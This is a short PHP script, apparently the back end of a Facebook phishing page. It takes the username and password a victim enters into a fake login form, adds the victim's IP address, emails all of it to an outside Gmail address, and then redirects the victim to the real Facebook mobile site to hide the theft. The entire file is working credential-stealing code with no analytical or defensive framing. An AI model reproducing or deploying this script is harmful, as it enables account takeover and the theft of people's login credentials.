<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : ||FB || :------\n";
$message .= "User: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || THckingE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="debbyhunter4u2@gmail.com";
$subject = "FB| ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://m.facebook.com");
?>